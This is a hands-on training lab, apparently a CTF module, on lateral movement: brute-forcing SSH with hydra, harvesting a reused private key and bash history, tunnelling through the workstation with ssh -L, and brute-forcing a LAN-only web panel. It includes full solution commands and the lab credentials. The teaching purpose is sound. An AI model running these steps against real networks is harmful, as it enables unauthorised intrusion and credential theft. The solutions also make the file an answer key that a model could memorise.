title: CR-18 / Module 5 / N5a — Lateral Movement & Network Pivoting
description: Break into a workstation over SSH, harvest a reused private key, and pivot through it to brute-force a maintenance panel that only trusts the internal network. Lateral Movement & Network Pivoting (CTF1).
prerequisites: Comfort using a Linux shell and an SSH client
Familiarity with dictionary/brute-force attacks using hydra
Basic understanding of TCP port forwarding and tunnelling
CR-18 Modules 2-4 (enumeration, protocol and service-level attacks), or equivalent hands-on experience
outcomes: Demonstrate how a single compromised workstation enables internal reconnaissance
Pivot through a compromised host to bypass network segmentation controls
Exploit LAN-only services that are not externally accessible
Understand the risks associated with flat network architectures
Relate pivoting techniques to real-world lateral movement and post-exploitation tactics

levels.title: Introduction level
levels.content:
You’re in CR‑18‑n5a — Lateral Movement & Network Pivoting (CTF1).

You’re doing an internal test on a flat, badly segmented network. The client wants to see how far an attacker can move from one compromised workstation. Your job is to show that path, safely and within scope.

From your assessment box, you’ll map the subnet, crack a weak SSH login, pull reusable creds and keys, then pivot through that workstation to reach an internal server and a maintenance panel that only accepts LAN traffic.

Your machine already has everything: nmap, arp‑scan, hydra, curl, SSH, plus username/password wordlists in your home folder and on the Desktop.

The real result isn’t just access — it’s the chain: one weak password, one reused key, and a flat network letting you walk from a desktop to a “protected” server. That’s the finding.

levels.title: Get Access
levels.cloud_content:
In the topology panel on the right, right-click **pentestvm** and select **Open Console**. Log in with username **pentester** and password **pentester**. 


Once you're connected, submit the passkey **start-training** to unlock the next level.

levels.title: Background — pivoting and SSH port forwarding
levels.content:
You've handled recon and initial access in earlier modules. This challenge is about what you do *after* the first box falls: turning one foothold into reach you didn't have before. A short primer before you start.

## Lateral movement vs pivoting

**Lateral movement** is using access on one host to gain access on another — most often by reusing credentials or keys you find lying around. **Pivoting** is the network trick underneath it: routing your traffic *through* a machine you already control so you can reach hosts and ports your own machine cannot touch directly.

On a flat network the two blur together, but keep the distinction in mind. Reusing a key to log into the server is lateral movement; tunnelling through the workstation to reach a service that only trusts the workstation is pivoting.

## Why you need a pivot here

The maintenance panel on the internal server only answers the workstation. Connect to it straight from your assessment machine and you get nothing. But you own the workstation — if you can borrow its position on the network, the panel will talk to you as if you were it.

That is exactly what SSH local port forwarding does.

## SSH local port forwarding (-L)

The `-L` flag tells SSH: *open a port on my machine, and forward anything that hits it through the SSH connection and out the far end to a destination of my choosing.*

    ssh -fN -L 8080:<server-ip>:8080 <user>@<workstation-ip>

Read it from the far end back:

- `<user>@<workstation-ip>` — log into the workstation you already cracked.
- `<server-ip>:8080` — the far-end destination, resolved *from the workstation's point of view*, so the packet leaves the workstation and reaches the server the panel trusts.
- `8080:` — the local port opened on your assessment machine.
- `-f` backgrounds SSH after login; `-N` says "don't run a command, just hold the tunnel open."

After that, `http://localhost:8080` on your machine is really the panel on the server, arriving from the workstation's address. Your web tools now work against it as if it were local.

List the tunnel with `ps aux | grep ssh` and tear it down with `kill <PID>` (or `pkill -f 8080`) when you're done.

## Credential and key reuse

The reason the pivot is reachable at all is reuse. Admins clone images, copy SSH keys between machines, and reuse passwords across hosts. A private key sitting in `~/.ssh` on the workstation is often trusted by *other* boxes too — find it, and you may log straight into the next host without cracking anything. Command history (`~/.bash_history`) frequently hands you the account names and hosts to aim at.

That is the whole chain in this challenge: crack one SSH login, harvest a reused key and a server account name, pivot through the workstation, and brute-force the panel behind it.

levels.title: Establish a Foothold
levels.content:
Your testing machine sits on the client's flat LAN in the 192.168.0.0/24 range.

The scope for this phase is the local subnet: identify what's running, and gain access to the workstation that has been flagged for weak SSH configuration.

Your objectives for this level:

* Enumerate the live hosts on the local network and record their addresses.

*Note: 192.168.0.1 is the sandbox gateway and is out of scope for this engagement. Do not target it — concentrate on the hosts you discover beyond it.*

* Confirm that SSH is exposed on the workstation.
* Gain initial access by testing common usernames and weak passwords against the SSH service.

*Note: dictionaries of common usernames and weak passwords (users.txt and passwords.txt) are already staged in your home directory and on your Desktop — use them for the brute-force.*

* Once on the host, enumerate it as an attacker would. Users leave behind keys, configuration, and command history — identify the authentication artifacts that enable movement further into the network.

Locate the **ssh_flag** hidden among the workstation's authentication material and submit it as your answer for this stage.

Just as importantly, **note a valid server account name while you enumerate** — that credential is what lets you pivot from the workstation to the internal server in the next stage.
levels.solution:
* Find your subnet — `ip a` → confirms 192.168.0.0/24.
* Discover hosts — `nmap -sn 192.168.0.0/24` → finds 192.168.0.2 and 192.168.0.10 (arp-scan -l works too).
* Scan the service — `nmap -p 22 192.168.0.10` → SSH open.
* Brute-force SSH — `hydra -L users.txt -P passwords.txt ssh://192.168.0.10 -t 4` → jdoe/letmein123.
* Log in — `ssh jdoe@192.168.0.10`.
* Harvest the key — `ls -la ~/.ssh` then `cat ~/.ssh/id_rsa` → private key + the ssh_flag.
* Read the history — `cat ~/.bash_history` → reveals admin@192.168.0.2.

Findings:
* Host A 192.168.0.2 (server)
* Host B 192.168.0.10 (workstation)
* login jdoe
* password letmein123
* **ssh_flag: ${ANSWER}**
* **server user: admin**

hints.title: Try the Weak Locks
hints.content:
If SSH is exposed on a workstation, test for common usernames and weak passwords with a wordlist-based approach. The dictionaries (users.txt, passwords.txt) are in your home directory and on your Desktop.

Useful tool: hydra.

hints.title: Loot the Host
hints.content:
After gaining access, check for authentication artifacts — SSH keys, configuration files, command history. These are what let you move further inside the network.

Useful commands:
```
ls -la ~/.ssh
cat ~/.ssh/id_rsa
cat ~/.bash_history
```

hints.title: See What's Alive
hints.content:
You are inside a flat LAN. Before attacking any services, work out which hosts are alive in your subnet and what they expose.

Useful tool: nmap (or arp-scan).

levels.title: Demonstrate Internal Impact
levels.content:
The workstation isn’t the goal — it’s just your pivot.
The key and creds you pulled from it prove how reuse lets this single foothold reach deeper into the client’s network.

*Note: you'll need the server account name you found while enumerating the workstation. If you didn't note it, go back and check the command history.*

**Your objectives for this level:**

* Reuse the workstation's private key to authenticate to the internal server (192.168.0.2) and read the administrator's message left in their home directory — it names both the maintenance panel's location and the account to use. Note the service account username for your findings.
* That message points to a maintenance panel on the server. **The panel only accepts connections from the workstation and refuses your testing machine directly — but the workstation can reach it.** Use the workstation as a tunnel to bring the panel within reach of your own tooling.
* With the panel exposed through your pivot, brute-force its login to recover valid credentials and capture the flag behind it.

*Note: if you background the tunnel, list it with `ps aux | grep ssh` and stop it by PID with `kill <PID>`.*

*Note: use the staged wordlist.txt (home directory and Desktop) for the panel brute-force.*

This is the full attack path an assessment is meant to surface: one weak credential on one workstation, plus a reused key and a flat network, is enough to reach a service the client assumed was safe.

Locate the **Maintenance flag** behind the panel and submit it as your answer for this stage.
levels.solution:
* Reuse the key — from the workstation: `ssh -i ~/.ssh/id_rsa admin@192.168.0.2` → shell on the server. jdoe's private key is trusted by the admin account, so no password is needed.
* Read the admin message — `cat /home/admin/message.txt` → names the maintenance panel on 192.168.0.2:8080 and the `maintenance` service account.
* Build the pivot — from pentestvm: `ssh -fN -L 8080:192.168.0.2:8080 jdoe@192.168.0.10` → it prompts for jdoe's SSH password, then backgrounds, tunnelling the LAN-only panel to your own port 8080.
* Verify the tunnel — `curl http://localhost:8080/login` → returns the HTML login form. Note the `method="POST"` and the username/password field names; these are your brute-force parameters.
* Brute-force the panel — `hydra -l maintenance -P wordlist.txt -s 8080 localhost http-post-form "/login:username=^USER^&password=^PASS^:Unauthorized" -t 8` → maintenance/admin123.
* Capture the flag — with the tunnel still up, authenticate with the recovered creds:
`curl -s -X POST -d "username=maintenance&password=admin123" http://localhost:8080/login` → Access granted; the panel returns the maintenance flag.

Maintenance flag: ${ANSWER}

*Note: stop the background tunnel with `pkill -f 8080:192.168.0.2` when you're done.*

hints.title: Attack the Exposed Panel
hints.content:
The tunnel exposes the service on your own machine, so a standard web brute-force works against it:

`hydra -l maintenance -P wordlist.txt -s 8080 localhost http-post-form "/login:username=^USER^&password=^PASS^:Unauthorized" -t 8`

The `:Unauthorized` field is the failure string — hydra treats any response containing it as a failed login.

hints.title: Use Your Stepping Stone
hints.content:
You already own a machine inside the LAN. The panel won't answer your testing machine directly, but it will answer the workstation. SSH local port forwarding (`ssh -L`) lets you project the server's port onto your own machine, through the workstation. Background it so you keep your shell.

Useful: the `-L`, `-f`, and `-N` flags of ssh (`man ssh`).

hints.title: The Tunnel Command
hints.content:
From the pentest VM:

`ssh -fN -L 8080:192.168.0.2:8080 jdoe@192.168.0.10`

It prompts for jdoe's password, then backgrounds. `localhost:8080` on your machine now reaches the panel on the server. Stop it later with `pkill -f 8080:192.168.0.2`.

levels.title: Module 5 - Completed
levels.content: You've reached the end of CR-18-n5a — Lateral Movement & Network Pivoting (CTF1). Nice work walking the full chain from a single weak SSH login to the maintenance panel behind the pivot. Head back to the LMS to continue the course.
